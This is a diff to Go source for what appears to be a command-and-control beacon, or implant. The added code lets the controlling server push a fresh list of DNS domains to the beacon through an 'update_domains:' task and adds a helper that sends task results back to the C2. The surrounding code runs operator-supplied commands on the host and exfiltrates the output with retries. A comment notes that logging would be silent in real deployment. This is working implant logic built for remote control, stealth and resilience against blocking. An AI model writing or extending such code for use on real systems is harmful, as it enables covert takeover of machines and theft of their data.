@@ -240,6 +240,43 @@ func (b *Beacon) parseTask(response string) (taskID, command string, isTask bool
 	return "", "", false
 }
 
+// handleUpdateDomains updates the beacon's DNS domain list
+func (b *Beacon) handleUpdateDomains(domainsJSON string) {
+	// Parse JSON array of domains
+	domainsJSON = strings.TrimSpace(domainsJSON)
+	if !strings.HasPrefix(domainsJSON, "[") || !strings.HasSuffix(domainsJSON, "]") {
+		return // Invalid format
+	}
+
+	// Simple JSON array parser (domains should be strings)
+	domainsJSON = strings.TrimPrefix(domainsJSON, "[")
+	domainsJSON = strings.TrimSuffix(domainsJSON, "]")
+
+	var newDomains []string
+	for _, domain := range strings.Split(domainsJSON, ",") {
+		domain = strings.Trim(strings.TrimSpace(domain), "\"")
+		if domain != "" {
+			newDomains = append(newDomains, domain)
+		}
+	}
+
+	if len(newDomains) > 0 {
+		// Update client domains
+		b.client.mutex.Lock()
+		b.client.config.DNSDomains = newDomains
+		b.client.domainIndex = 0 // Reset to first domain
+		b.client.mutex.Unlock()
+
+		// Log update (in real deployment, this would be silent)
+		// fmt.Printf("[Beacon] Updated domains: %v\n", newDomains)
+	}
+}
+
+// sendResult sends a task result back to the C2
+func (b *Beacon) sendResult(taskID, result string) error {
+	return b.exfiltrateResult(taskID, result)
+}
+
 // runBeacon starts the beacon loop
 func (b *Beacon) runBeacon() {
 	b.running = true
@@ -276,7 +313,16 @@ func (b *Beacon) runBeacon() {
 		// Check if server has a task for us
 		taskID, command, isTask := b.parseTask(response)
 		if isTask {
-			// Execute the command
+			// Check for special commands
+			if strings.HasPrefix(command, "update_domains:") {
+				// Special system command to update DNS domain list
+				b.handleUpdateDomains(command[15:]) // Skip "update_domains:" prefix
+				// Send success acknowledgment
+				_ = b.sendResult(taskID, "domains_updated")
+				continue
+			}
+
+			// Execute regular command
 			result := b.executeCommand(command)
 
 			// Exfiltrate the result with retries
